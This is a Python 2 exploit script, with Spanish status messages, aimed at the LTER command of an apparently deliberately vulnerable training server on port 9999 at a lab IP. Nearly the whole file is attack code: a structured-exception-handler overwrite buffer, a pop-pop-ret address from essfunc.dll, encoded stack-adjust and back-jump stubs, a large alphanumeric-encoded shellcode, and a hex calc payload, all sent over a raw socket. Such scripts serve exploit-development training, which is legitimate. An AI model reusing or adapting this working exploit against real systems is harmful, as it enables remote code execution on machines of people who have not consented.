#!/usr/bin/python

import sys
import socket
import random
import string
import struct

def pwned(_host, _port, _payload):
    print "[*] Conectandose a {0}:{1}...".format(_host, _port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((_host, _port))
    print "[*] Conectado, Enviando payload {0} bytes...".format(len(_payload))
    _payload = "{0}\r\n\r\n".format(_payload, _host)
    print _payload
    s.send(_payload)
    s.close
    print "[+] Payload de {0} bytes Enviado.".format(len(_payload))

def main():
  _host = "192.168.5.129"
  _port = 9999
  _offset_eip = 3534
  _nseh = struct.pack("<L",0x90900674) 
  _seh  = struct.pack("<L",0x6250160A) #625011BF pop ebx # pop ebx # retn essfunc.dll
  _espAdj = "\x54\x58\x66\x05\x73\x13\x50\x5C" #0x13a6
  _backJump1 = ""
  _backJump1 += "\x25\x4A\x4D\x4E\x55"
  _backJump1 += "\x25\x35\x32\x31\x2A"
  _backJump1 += "\x05\x76\x40\x50\x50"
  _backJump1 += "\x05\x75\x40\x40\x40"
  _backJump1 += "\x50"
  _espAdj2 = "\x54\x58\x2c\x2b\x50\x5c"
  _backJump2 = ""
  _backJump2 += "\x54\x5B"
  _backJump2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
  _backJump2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
  _backJump2 += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
  _backJump2 += "\x05\x11\x11\x66\x52" ## add  eax, 0x52661111
  _backJump2 += "\x05\x11\x11\x55\x62" ## add  eax, 0x62551111
  _backJump2 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
  _backJump2 += "\x50"                 ## push eax
  _backJump2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
  _backJump2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
  _backJump2 += "\x05\x41\x76\x66\x07" ## add  eax, 0x07667641
  _backJump2 += "\x05\x40\x75\x66\x06" ## add  eax, 0x06667540
  _backJump2 += "\x50"
  _break = 4000

  _shellcode =  ""
  _shellcode += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
  _shellcode += "\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
  _shellcode += "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
  _shellcode += "\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
  _shellcode += "\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x6d"
  _shellcode += "\x38\x6f\x72\x53\x30\x63\x30\x33\x30\x53\x50"
  _shellcode += "\x6f\x79\x59\x75\x70\x31\x4f\x30\x61\x74\x6e"
  _shellcode += "\x6b\x52\x70\x50\x30\x6c\x4b\x53\x62\x74\x4c"
  _shellcode += "\x6e\x6b\x53\x62\x74\x54\x6e\x6b\x71\x62\x45"
  _shellcode += "\x78\x56\x6f\x4c\x77\x42\x6a\x57\x56\x75\x61"
  _shellcode += "\x69\x6f\x6e\x4c\x65\x6c\x43\x51\x73\x4c\x63"
  _shellcode += "\x32\x34\x6c\x51\x30\x69\x51\x58\x4f\x54\x4d"
  _shellcode += "\x35\x51\x38\x47\x5a\x42\x39\x62\x46\x32\x46"
  _shellcode += "\x37\x6c\x4b\x50\x52\x62\x30\x6e\x6b\x62\x6a"
  _shellcode += "\x57\x4c\x6e\x6b\x32\x6c\x56\x71\x42\x58\x48"
  _shellcode += "\x63\x57\x38\x67\x71\x4a\x71\x33\x61\x6c\x4b"
  _shellcode += "\x66\x39\x75\x70\x33\x31\x38\x53\x6e\x6b\x31"
  _shellcode += "\x59\x46\x78\x6d\x33\x55\x6a\x32\x69\x6e\x6b"
  _shellcode += "\x77\x44\x6e\x6b\x65\x51\x4a\x76\x70\x31\x59"
  _shellcode += "\x6f\x4c\x6c\x69\x51\x78\x4f\x44\x4d\x37\x71"
  _shellcode += "\x48\x47\x47\x48\x79\x70\x32\x55\x39\x66\x54"
  _shellcode += "\x43\x73\x4d\x79\x68\x67\x4b\x73\x4d\x74\x64"
  _shellcode += "\x51\x65\x59\x74\x61\x48\x4c\x4b\x53\x68\x76"
  _shellcode += "\x44\x63\x31\x6e\x33\x71\x76\x4c\x4b\x76\x6c"
  _shellcode += "\x72\x6b\x6c\x4b\x76\x38\x75\x4c\x53\x31\x4a"
  _shellcode += "\x73\x6e\x6b\x65\x54\x6e\x6b\x76\x61\x4a\x70"
  _shellcode += "\x6f\x79\x43\x74\x57\x54\x74\x64\x73\x6b\x61"
  _shellcode += "\x4b\x50\x61\x76\x39\x73\x6a\x70\x51\x39\x6f"
  _shellcode += "\x69\x70\x31\x4f\x61\x4f\x62\x7a\x6e\x6b\x55"
  _shellcode += "\x42\x68\x6b\x6c\x4d\x33\x6d\x32\x48\x45\x63"
  _shellcode += "\x44\x72\x33\x30\x43\x30\x43\x58\x42\x57\x62"
  _shellcode += "\x53\x47\x42\x53\x6f\x43\x64\x42\x48\x50\x4c"
  _shellcode += "\x51\x67\x76\x46\x46\x67\x6b\x4f\x39\x45\x4e"
  _shellcode += "\x58\x5a\x30\x73\x31\x53\x30\x35\x50\x54\x69"
  _shellcode += "\x48\x44\x43\x64\x72\x70\x75\x38\x66\x49\x4b"
  _shellcode += "\x30\x42\x4b\x55\x50\x49\x6f\x4a\x75\x46\x30"
  _shellcode += "\x56\x30\x50\x50\x72\x70\x57\x30\x62\x70\x67"
  _shellcode += "\x30\x42\x70\x42\x48\x39\x7a\x66\x6f\x79\x4f"
  _shellcode += "\x49\x70\x6b\x4f\x49\x45\x4f\x67\x70\x6a\x66"
  _shellcode += "\x65\x65\x38\x4f\x30\x6c\x68\x33\x35\x4f\x77"
  _shellcode += "\x70\x68\x56\x62\x35\x50\x52\x31\x71\x4c\x6c"
  _shellcode += "\x49\x38\x66\x33\x5a\x74\x50\x46\x36\x53\x67"
  _shellcode += "\x65\x38\x4d\x49\x6f\x55\x33\x44\x33\x51\x79"
  _shellcode += "\x6f\x6a\x75\x4e\x65\x39\x50\x54\x34\x44\x4c"
  _shellcode += "\x59\x6f\x30\x4e\x65\x58\x53\x45\x4a\x4c\x62"
  _shellcode += "\x48\x78\x70\x4d\x65\x39\x32\x63\x66\x79\x6f"
  _shellcode += "\x49\x45\x50\x68\x43\x53\x30\x6d\x55\x34\x63"
  _shellcode += "\x30\x4f\x79\x78\x63\x42\x77\x30\x57\x66\x37"
  _shellcode += "\x75\x61\x49\x66\x72\x4a\x74\x52\x71\x49\x53"
  _shellcode += "\x66\x6b\x52\x6b\x4d\x32\x46\x6f\x37\x43\x74"
  _shellcode += "\x65\x74\x75\x6c\x47\x71\x33\x31\x4e\x6d\x52"
  _shellcode += "\x64\x34\x64\x64\x50\x4a\x66\x33\x30\x43\x74"
  _shellcode += "\x51\x44\x50\x50\x43\x66\x42\x76\x51\x46\x57"
  _shellcode += "\x36\x73\x66\x42\x6e\x52\x76\x76\x36\x30\x53"
  _shellcode += "\x71\x46\x55\x38\x61\x69\x38\x4c\x35\x6f\x4e"
  _shellcode += "\x66\x6b\x4f\x49\x45\x6e\x69\x49\x70\x62\x6e"
  _shellcode += "\x43\x66\x50\x46\x39\x6f\x50\x30\x33\x58\x56"
  _shellcode += "\x68\x4e\x67\x55\x4d\x75\x30\x69\x6f\x5a\x75"
  _shellcode += "\x4d\x6b\x6a\x50\x48\x35\x4e\x42\x53\x66\x51"
  _shellcode += "\x78\x6f\x56\x6e\x75\x6f\x4d\x6d\x4d\x4b\x4f"
  _shellcode += "\x6b\x65\x65\x6c\x74\x46\x33\x4c\x44\x4a\x4f"
  _shellcode += "\x70\x39\x6b\x49\x70\x31\x65\x37\x75\x6d\x6b"
  _shellcode += "\x61\x57\x36\x73\x50\x72\x62\x4f\x52\x4a\x77"
  _shellcode += "\x70\x70\x53\x6b\x4f\x49\x45\x41\x41"

  _calc = "33d2526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7".decode("hex")
 
  _inject = "LTER ."
  _inject += "\x41" * 3
  _inject += "\x54\x58\x66\x2d\xff\x0d\x50\x5c"
  _inject += "\x41" * 61
  _inject += _shellcode
  _inject += "\x41"*(3447 -3-61-len(_shellcode)-8)
  _inject += _espAdj2
  _inject += _backJump2
  _inject += "A" * (_offset_eip - 3447 - len(_espAdj2) - len(_backJump2))
  _inject += _nseh
  _inject += _seh
  _inject += _espAdj
  _inject += _backJump1
  _inject += "D" * (_break - len(_inject))

  pwned(_host,_port,_inject)

if __name__ == "__main__":
	main()
